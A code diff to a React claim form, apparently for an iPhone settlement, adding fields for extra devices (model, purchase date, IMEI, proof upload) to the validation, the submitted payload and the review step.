@@ -1,8 +1,8 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { useState, useMemo } from "react";
+import { useState, useMemo, useEffect } from "react";
 import { z } from "zod";
 import { toast } from "sonner";
-import { ShieldCheck, FileText, Users, Upload, Check, ArrowLeft, ArrowRight, Lock, CreditCard, Banknote, Mail, Landmark } from "lucide-react";
+import { ShieldCheck, FileText, Users, Upload, Check, ArrowLeft, ArrowRight, Lock, CreditCard, Banknote, Mail, Landmark, Smartphone } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 
@@ -12,6 +12,10 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 const searchSchema = z.object({
   tier: z.enum(["standard", "documented", "family", "devices2", "devices3", "devices4", "devices5", "devices6"]).optional(),
 });
+
+const DEVICE_COUNT: Record<string, number> = {
+  devices2: 2, devices3: 3, devices4: 4, devices5: 5, devices6: 6,
+};
 
 export const Route = createFileRoute("/claim")({
   validateSearch: searchSchema,
@@ -88,8 +92,28 @@ function ClaimPage() {
   const [purchaseDate, setPurchaseDate] = useState("");
   const [imeiSerial, setImeiSerial] = useState("");
 
-  // Proof
+  // Proof (device 1)
   const [proofFile, setProofFile] = useState<File | null>(null);
+
+  // Additional devices (2..N) when a multi-device tier is chosen
+  const [additionalDevices, setAdditionalDevices] = useState<ExtraDevice[]>([]);
+
+  const deviceCount = tier && DEVICE_COUNT[tier] ? DEVICE_COUNT[tier] : 1;
+
+  useEffect(() => {
+    const needed = Math.max(0, deviceCount - 1);
+    setAdditionalDevices((prev) => {
+      if (prev.length === needed) return prev;
+      if (prev.length < needed) {
+        return [...prev, ...Array.from({ length: needed - prev.length }, () => ({ model: "", purchaseDate: "", imeiSerial: "", proofFile: null }))];
+      }
+      return prev.slice(0, needed);
+    });
+  }, [deviceCount]);
+
+  const updateExtra = (idx: number, patch: Partial<ExtraDevice>) => {
+    setAdditionalDevices((prev) => prev.map((d, i) => (i === idx ? { ...d, ...patch } : d)));
+  };
 
   // Payment
   const [payment, setPayment] = useState<PaymentId | null>(null);
@@ -105,9 +129,18 @@ function ClaimPage() {
 
   const selected = tier ? TIERS[tier] : null;
 
+  const extrasValid = additionalDevices.every(
+    (d) => d.model && d.purchaseDate && d.imeiSerial.trim().length >= 6 && d.proofFile
+  );
+
   const canNextFromStep = useMemo(() => {
     if (step === 1) return !!tier;
-    if (step === 2) return firstName && lastName && email && address && city && stateVal && zip && deviceInfo && purchaseDate && imeiSerial.trim().length >= 6 && (!selected?.requiresProof || proofFile);
+    if (step === 2)
+      return (
+        firstName && lastName && email && address && city && stateVal && zip &&
+        deviceInfo && purchaseDate && imeiSerial.trim().length >= 6 &&
+        (!selected?.requiresProof || proofFile) && extrasValid
+      );
     if (step === 3) {
       if (!payment) return false;
       if (payment === "paypal") return /.+@.+\..+/.test(paypalEmail);
@@ -117,7 +150,8 @@ function ClaimPage() {
     }
     if (step === 4) return attest;
     return false;
-  }, [step, tier, firstName, lastName, email, address, city, stateVal, zip, deviceInfo, purchaseDate, imeiSerial, selected, proofFile, payment, paypalEmail, routing, account, attest]);
+  }, [step, tier, firstName, lastName, email, address, city, stateVal, zip, deviceInfo, purchaseDate, imeiSerial, selected, proofFile, extrasValid, payment, paypalEmail, routing, account, attest]);
+
 
   const handleNext = () => {
     if (!canNextFromStep) {
@@ -154,6 +188,12 @@ function ClaimPage() {
       purchaseDate,
       imeiSerial,
       proofFileName: proofFile?.name ?? null,
+      devices: [
+        { model: deviceInfo, purchaseDate, imeiSerial, proofFileName: proofFile?.name ?? null },
+        ...additionalDevices.map((d) => ({
+          model: d.model, purchaseDate: d.purchaseDate, imeiSerial: d.imeiSerial, proofFileName: d.proofFile?.name ?? null,
+        })),
+      ],
       payment: payment!,
       paypalEmail: payment === "paypal" ? paypalEmail : "",
       accountType: payment === "ach" ? accountType : "",
@@ -186,7 +226,8 @@ function ClaimPage() {
             {...{ firstName, setFirstName, lastName, setLastName, email, setEmail, phone, setPhone,
               address, setAddress, city, setCity, stateVal, setStateVal, zip, setZip, deviceInfo, setDeviceInfo,
               purchaseDate, setPurchaseDate, imeiSerial, setImeiSerial,
-              proofFile, setProofFile, requiresProof: !!selected?.requiresProof, tierName: selected?.name ?? "" }}
+              proofFile, setProofFile, requiresProof: !!selected?.requiresProof, tierName: selected?.name ?? "",
+              additionalDevices, updateExtra }}
           />
         )}
         {step === 3 && (
@@ -198,7 +239,7 @@ function ClaimPage() {
         {step === 4 && selected && payment && (
           <StepReview
             tier={selected} payment={payment}
-            data={{ firstName, lastName, email, phone, address, city, stateVal, zip, deviceInfo, imeiSerial, proofFile, paypalEmail, routing, account }}
+            data={{ firstName, lastName, email, phone, address, city, stateVal, zip, deviceInfo, purchaseDate, imeiSerial, proofFile, paypalEmail, routing, account, additionalDevices }}
             attest={attest} setAttest={setAttest}
           />
         )}
@@ -303,6 +344,8 @@ function StepTier({ tier, setTier }: { tier: TierKey | null; setTier: (t: TierKe
   );
 }
 
+type ExtraDevice = { model: string; purchaseDate: string; imeiSerial: string; proofFile: File | null };
+
 function StepPersonal(props: {
   firstName: string; setFirstName: (v: string) => void;
   lastName: string; setLastName: (v: string) => void;
@@ -318,6 +361,8 @@ function StepPersonal(props: {
   proofFile: File | null; setProofFile: (f: File | null) => void;
   requiresProof: boolean;
   tierName: string;
+  additionalDevices: ExtraDevice[];
+  updateExtra: (idx: number, patch: Partial<ExtraDevice>) => void;
 }) {
   const p = props;
   return (
@@ -337,72 +382,139 @@ function StepPersonal(props: {
         </div>
       </div>
 
-      <div className="mt-6 grid gap-4 sm:grid-cols-2">
-        <div>
-          <Label htmlFor="device" className="mb-1.5 block text-sm font-medium">iPhone model <span className="text-destructive">*</span></Label>
-          <Select value={p.deviceInfo} onValueChange={p.setDeviceInfo}>
-            <SelectTrigger id="device"><SelectValue placeholder="Select your iPhone" /></SelectTrigger>
-            <SelectContent className="max-h-72">
-              {IPHONE_MODELS.map((m) => <SelectItem key={m} value={m}>{m}</SelectItem>)}
-            </SelectContent>
-          </Select>
+      <div className="mt-8 rounded-xl border border-border bg-background p-5">
+        <div className="mb-4 flex items-center gap-2">
+          <Smartphone className="h-4 w-4 text-primary" />
+          <h3 className="text-sm font-semibold">
+            {p.additionalDevices.length > 0 ? "Device 1" : "Device information"}
+          </h3>
         </div>
-        <div>
-          <Label htmlFor="purchaseDate" className="mb-1.5 block text-sm font-medium">Date purchased <span className="text-destructive">*</span></Label>
-          <Input
-            id="purchaseDate"
-            type="date"
-            value={p.purchaseDate}
-            onChange={(e) => p.setPurchaseDate(e.target.value)}
-            min="2014-09-17"
-            max={new Date().toISOString().slice(0, 10)}
-          />
-        </div>
-      </div>
-      <p className="mt-1.5 text-xs text-muted-foreground">Device must have been used during the class period (Sept 17, 2014 – Dec 31, 2024).</p>
 
-      <div className="mt-6">
-        <Label htmlFor="imei" className="mb-1.5 block text-sm font-medium">iPhone IMEI or Serial Number <span className="text-destructive">*</span></Label>
-        <Input
-          id="imei"
-          value={p.imeiSerial}
-          onChange={(e) => p.setImeiSerial(e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 20))}
-          placeholder="e.g. 356789102345678"
-          inputMode="text"
-          autoCapitalize="characters"
-        />
-        <p className="mt-1.5 text-xs text-muted-foreground">
-          Find it in Settings → General → About, or dial *#06# on your iPhone.
-        </p>
-      </div>
-
-
-
-      {p.requiresProof && (
-        <div className="mt-6">
-          <Label className="mb-1.5 block text-sm font-medium">Proof of ownership <span className="text-destructive">*</span></Label>
-          <label className="flex cursor-pointer flex-col items-center justify-center gap-2 rounded-xl border-2 border-dashed border-border bg-background px-6 py-8 text-center transition hover:border-accent hover:bg-background">
-            <Upload className="h-6 w-6 text-muted-foreground" />
-            <div className="text-sm font-medium">
-              {p.proofFile ? p.proofFile.name : "Click to upload receipt or proof of purchase"}
-            </div>
-            <div className="text-xs text-muted-foreground">PDF, JPG, or PNG · Max 10MB</div>
-            <input
-              type="file"
-              className="hidden"
-              accept=".pdf,.jpg,.jpeg,.png"
-              onChange={(e) => {
-                const f = e.target.files?.[0];
-                if (f && f.size > 10 * 1024 * 1024) { toast.error("File is too large (max 10MB)."); return; }
-                p.setProofFile(f ?? null);
-              }}
+        <div className="grid gap-4 sm:grid-cols-2">
+          <div>
+            <Label htmlFor="device" className="mb-1.5 block text-sm font-medium">iPhone model <span className="text-destructive">*</span></Label>
+            <Select value={p.deviceInfo} onValueChange={p.setDeviceInfo}>
+              <SelectTrigger id="device"><SelectValue placeholder="Select your iPhone" /></SelectTrigger>
+              <SelectContent className="max-h-72">
+                {IPHONE_MODELS.map((m) => <SelectItem key={m} value={m}>{m}</SelectItem>)}
+              </SelectContent>
+            </Select>
+          </div>
+          <div>
+            <Label htmlFor="purchaseDate" className="mb-1.5 block text-sm font-medium">Date purchased <span className="text-destructive">*</span></Label>
+            <Input
+              id="purchaseDate"
+              type="date"
+              value={p.purchaseDate}
+              onChange={(e) => p.setPurchaseDate(e.target.value)}
+              min="2014-09-17"
+              max={new Date().toISOString().slice(0, 10)}
             />
-          </label>
+          </div>
         </div>
-      )}
+        <p className="mt-1.5 text-xs text-muted-foreground">Device must have been used during the class period (Sept 17, 2014 – Dec 31, 2024).</p>
+
+        <div className="mt-4">
+          <Label htmlFor="imei" className="mb-1.5 block text-sm font-medium">iPhone IMEI or Serial Number <span className="text-destructive">*</span></Label>
+          <Input
+            id="imei"
+            value={p.imeiSerial}
+            onChange={(e) => p.setImeiSerial(e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 20))}
+            placeholder="e.g. 356789102345678"
+            inputMode="text"
+            autoCapitalize="characters"
+          />
+          <p className="mt-1.5 text-xs text-muted-foreground">
+            Find it in Settings → General → About, or dial *#06# on your iPhone.
+          </p>
+        </div>
+
+        {p.requiresProof && (
+          <div className="mt-4">
+            <Label className="mb-1.5 block text-sm font-medium">Proof of ownership <span className="text-destructive">*</span></Label>
+            <label className="flex cursor-pointer flex-col items-center justify-center gap-2 rounded-xl border-2 border-dashed border-border bg-background px-6 py-8 text-center transition hover:border-accent hover:bg-background">
+              <Upload className="h-6 w-6 text-muted-foreground" />
+              <div className="text-sm font-medium">
+                {p.proofFile ? p.proofFile.name : "Click to upload receipt or proof of purchase"}
+              </div>
+              <div className="text-xs text-muted-foreground">PDF, JPG, or PNG · Max 10MB</div>
+              <input
+                type="file"
+                className="hidden"
+                accept=".pdf,.jpg,.jpeg,.png"
+                onChange={(e) => {
+                  const f = e.target.files?.[0];
+                  if (f && f.size > 10 * 1024 * 1024) { toast.error("File is too large (max 10MB)."); return; }
+                  p.setProofFile(f ?? null);
+                }}
+              />
+            </label>
+          </div>
+        )}
+      </div>
+
+      {p.additionalDevices.map((d, i) => (
+        <div key={i} className="mt-6 rounded-xl border border-border bg-background p-5">
+          <div className="mb-4 flex items-center gap-2">
+            <Smartphone className="h-4 w-4 text-primary" />
+            <h3 className="text-sm font-semibold">Device {i + 2}</h3>
+          </div>
+          <div className="grid gap-4 sm:grid-cols-2">
+            <div>
+              <Label className="mb-1.5 block text-sm font-medium">iPhone model <span className="text-destructive">*</span></Label>
+              <Select value={d.model} onValueChange={(v) => p.updateExtra(i, { model: v })}>
+                <SelectTrigger><SelectValue placeholder="Select iPhone" /></SelectTrigger>
+                <SelectContent className="max-h-72">
+                  {IPHONE_MODELS.map((m) => <SelectItem key={m} value={m}>{m}</SelectItem>)}
+                </SelectContent>
+              </Select>
+            </div>
+            <div>
+              <Label className="mb-1.5 block text-sm font-medium">Date purchased <span className="text-destructive">*</span></Label>
+              <Input
+                type="date"
+                value={d.purchaseDate}
+                onChange={(e) => p.updateExtra(i, { purchaseDate: e.target.value })}
+                min="2014-09-17"
+                max={new Date().toISOString().slice(0, 10)}
+              />
+            </div>
+          </div>
+          <div className="mt-4">
+            <Label className="mb-1.5 block text-sm font-medium">IMEI or Serial Number <span className="text-destructive">*</span></Label>
+            <Input
+              value={d.imeiSerial}
+              onChange={(e) => p.updateExtra(i, { imeiSerial: e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 20) })}
+              placeholder="e.g. 356789102345678"
+              autoCapitalize="characters"
+            />
+          </div>
+          <div className="mt-4">
+            <Label className="mb-1.5 block text-sm font-medium">Proof of ownership <span className="text-destructive">*</span></Label>
+            <label className="flex cursor-pointer flex-col items-center justify-center gap-2 rounded-xl border-2 border-dashed border-border bg-background px-6 py-6 text-center transition hover:border-accent">
+              <Upload className="h-5 w-5 text-muted-foreground" />
+              <div className="text-sm font-medium">
+                {d.proofFile ? d.proofFile.name : "Click to upload receipt or proof of purchase"}
+              </div>
+              <div className="text-xs text-muted-foreground">PDF, JPG, or PNG · Max 10MB</div>
+              <input
+                type="file"
+                className="hidden"
+                accept=".pdf,.jpg,.jpeg,.png"
+                onChange={(e) => {
+                  const f = e.target.files?.[0];
+                  if (f && f.size > 10 * 1024 * 1024) { toast.error("File is too large (max 10MB)."); return; }
+                  p.updateExtra(i, { proofFile: f ?? null });
+                }}
+              />
+            </label>
+          </div>
+        </div>
+      ))}
     </div>
   );
 }
+
 
 function StepPayment(props: {
   payment: PaymentId | null; setPayment: (p: PaymentId) => void;
@@ -494,13 +606,18 @@ function StepReview({
   data: {
     firstName: string; lastName: string; email: string; phone: string;
     address: string; city: string; stateVal: string; zip: string;
-    deviceInfo: string; imeiSerial: string; proofFile: File | null;
+    deviceInfo: string; purchaseDate: string; imeiSerial: string; proofFile: File | null;
     paypalEmail: string; routing: string; account: string;
+    additionalDevices: ExtraDevice[];
   };
   attest: boolean;
   setAttest: (v: boolean) => void;
 }) {
   const paymentName = PAYMENTS.find((p) => p.id === payment)?.name ?? "";
+  const allDevices = [
+    { model: data.deviceInfo, purchaseDate: data.purchaseDate, imeiSerial: data.imeiSerial, proofFile: data.proofFile },
+    ...data.additionalDevices,
+  ];
   return (
     <div>
       <h2 className="text-xl font-semibold">Review & submit</h2>
@@ -512,9 +629,15 @@ function StepReview({
         <ReviewRow label="Email" value={data.email} />
         {data.phone && <ReviewRow label="Phone" value={data.phone} />}
         <ReviewRow label="Address" value={`${data.address}, ${data.city}, ${data.stateVal} ${data.zip}`} />
-        <ReviewRow label="iPhone model" value={data.deviceInfo} />
-        <ReviewRow label="IMEI / Serial Number" value={data.imeiSerial} />
-        {data.proofFile && <ReviewRow label="Proof of ownership" value={data.proofFile.name} />}
+        {allDevices.map((d, i) => (
+          <div key={i} className="rounded-lg border border-border bg-background p-4">
+            <div className="mb-2 text-xs font-semibold uppercase tracking-wide text-muted-foreground">Device {i + 1}</div>
+            <ReviewRow label="iPhone model" value={d.model} />
+            <ReviewRow label="Date purchased" value={d.purchaseDate} />
+            <ReviewRow label="IMEI / Serial" value={d.imeiSerial} />
+            {d.proofFile && <ReviewRow label="Proof of ownership" value={d.proofFile.name} />}
+          </div>
+        ))}
         <ReviewRow label="Payment method" value={paymentName} />
         {payment === "paypal" && <ReviewRow label="PayPal email" value={data.paypalEmail} />}
         {payment === "ach" && (
@@ -524,6 +647,7 @@ function StepReview({
           </>
         )}
       </div>
+
 
       <div className="mt-6 rounded-xl border-2 border-destructive/40 bg-destructive/10 p-4 text-sm">
         <div className="font-semibold text-foreground">Important — required to approve your claim</div>
